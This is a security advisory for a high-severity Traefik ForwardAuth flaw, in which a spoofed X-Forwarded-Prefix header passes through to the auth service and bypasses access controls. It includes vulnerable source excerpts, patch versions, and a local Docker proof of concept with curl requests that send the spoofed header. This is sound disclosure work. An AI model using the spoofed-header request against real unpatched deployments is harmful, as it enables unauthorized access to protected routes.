# [H] Traefik's ForwardAuth trustForwardHeader=false allows spoofed X-Forwarded-Prefix to bypass authentication

## Summary
Severity: High
Advisory: GHSA-6384-m2mw-rf54
CVE: CVE-2026-35051
CWE: CWE-345
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-24
Source: https://github.com/advisories/GHSA-6384-m2mw-rf54
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v3` — affected >=3.7.0-ea.1 <3.7.0-rc.2
- Go: `github.com/traefik/traefik/v3` — affected >=3.0.0-beta1 <3.6.14
- Go: `github.com/traefik/traefik/v2` — affected >=0 <2.11.43
- Go: `github.com/traefik/traefik` — affected >=0

## Details
## Summary

There is a high-severity authentication bypass vulnerability in Traefik's `ForwardAuth` middleware when `trustForwardHeader=false` is configured and Traefik is deployed behind a trusted upstream proxy.

While `X-Forwarded-*` headers (such as `X-Forwarded-For`, `X-Forwarded-Host`, and `X-Forwarded-Proto`) from trusted context are correctly rebuilt, it does not strip or rebuild `X-Forwarded-Prefix`, leaving any attacker-supplied value intact in the subrequest forwarded to the authentication service.

When the authentication service makes authorization decisions based on `X-Forwarded-Prefix`, an external attacker can spoof a trusted prefix value and gain unauthorized access to protected backend routes.

## Patches

- https://github.com/traefik/traefik/releases/tag/v2.11.43
- https://github.com/traefik/traefik/releases/tag/v3.6.14
- https://github.com/traefik/traefik/releases/tag/v3.7.0-rc.2

## For more information

If there are any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

### Summary
`ForwardAuth` with `trustForwardHeader=false` still forwards an attacker-controlled `X-Forwarded-Prefix` header to the authentication service when Traefik is deployed behind a trusted upstream proxy. If the auth service relies on `X-Forwarded-Prefix` for authorization or routing decisions, an external attacker can bypass access controls and reach protected backend routes.

This was validated this against Traefik `v3.6.12` using the official Docker image and a minimal local Docker setup. A direct request to Traefik is correctly rejected, but the same request succeeds when sent through a trusted reverse proxy, which shows the issue is in the `ForwardAuth` subrequest handling rather than general ingress header stripping.

### Details
The vulnerable behavior comes from the way Traefik builds the subrequest sent to the forward-auth server.

In [`pkg/middlewares/auth/forward.go`](pkg/middlewares/auth/forward.go), `writeHeader` first copies all incoming request headers into the auth subrequest:

```go
func writeHeader(req, forwardReq *http.Request, trustForwardHeader bool, allowedHeaders []string) {
    utils.CopyHeaders(forwardReq.Header, req.Header)
    ...
    forwardReq.Header = filterForwardRequestHeaders(forwardReq.Header, allowedHeaders)
```

It then selectively rebuilds only a subset of forwarded headers when `trustForwardHeader=false`, for example:

- `X-Forwarded-For`
- `X-Forwarded-Method`
- `X-Forwarded-Proto`
- `X-Forwarded-Port`
- `X-Forwarded-Host`
- `X-Forwarded-Uri`

However, it does **not** remove or rebuild `X-Forwarded-Prefix`, so an attacker-supplied value remains in the auth request even when forwarded headers are supposed to be untrusted.

This becomes security-relevant when `StripPrefix` is used before `ForwardAuth`. In [`pkg/middlewares/stripprefix/strip_prefix.go`](pkg/middlewares/stripprefix/strip_prefix.go), Traefik appends the stripped prefix using `Header.Add`:

```go
func (s *stripPrefix) serveRequest(rw http.ResponseWriter, req *http.Request, prefix string) {
    req.Header.Add(ForwardedPrefixHeader, prefix)
```

If the attacker already sent `X-Forwarded-Prefix: /admin`, and `StripPrefix` later adds `/forbidden`, the auth service receives both values in this order:

1. `/admin` (attacker-controlled)
2. `/forbidden` (Traefik-generated)

An auth service that uses the first `X-Forwarded-Prefix` value can therefore be tricked into authorizing a protected route.

Why this appears unintended:

- The docs say `trustForwardHeader` means "Trust all X-Forwarded-* headers" and defaults to `false`.
- The migration notes say `X-Forwarded-Prefix` is handled like other `X-Forwarded-*` headers and removed from untrusted sources.
- The direct-to-Traefik test case behaves consistently with that expectation and returns `403`.
- Only the auth subrequest path still honors the spoofed `X-Forwarded-Prefix`.

Relevant source/documentation locations:

- `pkg/middlewares/auth/forward.go` lines 393-459
- `pkg/middlewares/stripprefix/strip_prefix.go` lines 65-68
- `pkg/middlewares/forwardedheaders/forwarded_header.go` lines 15-43
- `docs/content/reference/routing-configuration/http/middlewares/forwardauth.md` lines 59-62 and 130-140
- `docs/content/migrate/v3.md` lines 192-196

This was only tested and validated with `X-Forwarded-Prefix`. By source review, other forwarded headers that are copied but not rebuilt in `writeHeader` may deserve separate review, but I am not claiming impact for them here.

### PoC
The following uses the official `traefik:v3.6.12` Docker image and a mounted `traefik.toml`, matching the documented deployment style.

1. Create `traefik.toml`:

```toml
[entryPoints]
  [entryPoints.web]
    address = ":80"
    [entryPoints.web.forwardedHeaders]
      trustedIPs = ["172.31.79.0/24"]

[providers]
  [providers.file]
    filename = "/etc/traefik/dynamic.toml"
    watch = false

[log]
  level = "DEBUG"

[accessLog]
```

2. Create `dynamic.toml`:

```toml
[http.routers]
  [http.routers.app]
    entryPoints = ["web"]
    rule = "Host(`app.local`) && PathPrefix(`/forbidden`)"
    middlewares = ["strip-forbidden", "authz"]
    service = "backend"

[http.middlewares]
  [http.middlewares.strip-forbidden.stripPrefix]
    prefixes = ["/forbidden"]

  [http.middlewares.authz.forwardAuth]
    address = "http://auth:8000/check"
    trustForwardHeader = false
    authResponseHeaders = ["X-Auth-First-Prefix", "X-Auth-All-Prefixes"]

[http.services]
  [http.services.backend.loadBalancer]
    [[http.services.backend.loadBalancer.servers]]
      url = "http://backend:80"
```

3. Create `auth.py`:

```python
import json
from http.server import BaseHTTPRequestHandler, HTTPServer


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if not self.path.startswith("/check"):
            self.send_response(404)
            self.end_headers()
            return

        prefixes = self.headers.get_all("X-Forwarded-Prefix") or []
        first = prefixes[0] if prefixes else ""
        payload = {
            "path": self.path,
            "first_prefix": first,
            "all_prefixes": prefixes,
            "x_forwarded_for": self.headers.get_all("X-Forwarded-For") or [],
        }
        print(json.dumps(payload), flush=True)

        if first == "/admin":
            self.send_response(200)
            self.send_header("X-Auth-First-Prefix", first)
            self.send_header("X-Auth-All-Prefixes", "|".join(prefixes))
            self.end_headers()
            self.wfile.write(b"authorized\n")
            return

        self.send_response(403)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(payload).encode() + b"\n")


HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
```

4. Create `frontend.conf`:

```nginx
server {
    listen 80;
    access_log /dev/stdout;

    location / {
        proxy_http_version 1.1;
        proxy_pass http://traefik:80;
        proxy_set_header Host $http_host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

5. Start the containers:

```bash
docker network create --subnet 172.31.79.0/24 traefik-readme-net

docker run -d --name traefik-readme-backend \
  --network traefik-readme-net \
  --network-alias backend \
  traefik/whoami

docker run -d --name traefik-readme-auth \
  --network traefik-readme-net \
  --network-alias auth \
  -v "$PWD/auth.py:/app/auth.py:ro" \
  -w /app \
  python:3.12-alpine \
  python /app/auth.py

docker run -d --name traefik-readme-traefik \
  --network traefik-readme-net \
  --network-alias traefik \
  -p 18081:80 \
  -v "$PWD/traefik.toml:/etc/traefik/traefik.toml:ro" \
  -v "$PWD/dynamic.toml:/etc/traefik/dynamic.toml:ro" \
  traefik:v3.6.12

docker run -d --name traefik-readme-frontend \
  --network traefik-readme-net \
  -p 18080:80 \
  -v "$PWD/frontend.conf:/etc/nginx/conf.d/default.conf:ro" \
  nginx:alpine
```

6. Send three requests:

Direct to Traefik, spoofed header:
```bash
curl -sS -i \
  -H 'Host: app.local' \
  -H 'X-Forwarded-Prefix: /admin' \
  http://127.0.0.1:18081/forbidden/test
```

Expected result:
```http
HTTP/1.1 403 Forbidden
...
{"path": "/check", "first_prefix": "/forbidden", "all_prefixes": ["/forbidden"]}
```

Through trusted proxy, no spoofing:
```bash
curl -sS -i \
  -H 'Host: app.local' \
  http://127.0.0.1:18080/forbidden/test
```

Expected result:
```http
HTTP/1.1 403 Forbidden
...
{"path": "/check", "first_prefix": "/forbidden", "all_prefixes": ["/forbidden"]}
```

Through trusted proxy, spoofed header:
```bash
curl -sS -i \
  -H 'Host: app.local' \
  -H 'X-Forwarded-Prefix: /admin' \
  http://127.0.0.1:18080/forbidden/test
```

Observed result:
```http
HTTP/1.1 200 OK
...
X-Auth-All-Prefixes: /admin|/forbidden
X-Auth-First-Prefix: /admin
X-Forwarded-Prefix: /admin
X-Forwarded-Prefix: /forbidden
```

The backend response confirms that the request reached the protected upstream after the auth service accepted the attacker-controlled prefix.

7. Optional log confirmation from the auth service:

```bash
docker logs traefik-readme-auth
```

Observed log sequence:
```json
{"path": "/check", "first_prefix": "/forbidden", "all_prefixes": ["/forbidden"], ...}
{"path": "/check", "first_prefix": "/forbidden", "all_prefixes": ["/forbidden"], ...}
{"path": "/check", "first_prefix": "/admin", "all_prefixes": ["/admin", "/forbidden"], ...}
```

8. Cleanup:

```bash
docker rm -f traefik-readme-traefik traefik-readme-backend traefik-readme-auth traefik-readme-frontend
docker network rm traefik-readme-net
```

### Impact
This is an authentication bypass / trust-boundary bypass.

Affected deployments are those that:

- run Traefik behind a trusted upstream proxy
- use `ForwardAuth`
- rely on `trustForwardHeader=false` to avoid trusting client-supplied forwarded headers
- pass `X-Forwarded-Prefix` to the auth service, which happens by default when `authRequestHeaders` is empty
- make authorization or routing decisions based on `X-Forwarded-Prefix`, especially when `StripPrefix` runs before `ForwardAuth`
In those environments, an unauthenticated external attacker can influence the auth service's view of the protected path and gain access to backend routes that should be denied.

</details>

----

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-6384-m2mw-rf54
- https://nvd.nist.gov/vuln/detail/CVE-2026-35051
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v2.11.43
- https://github.com/traefik/traefik/releases/tag/v3.6.14
- https://github.com/traefik/traefik/releases/tag/v3.7.0-rc.2
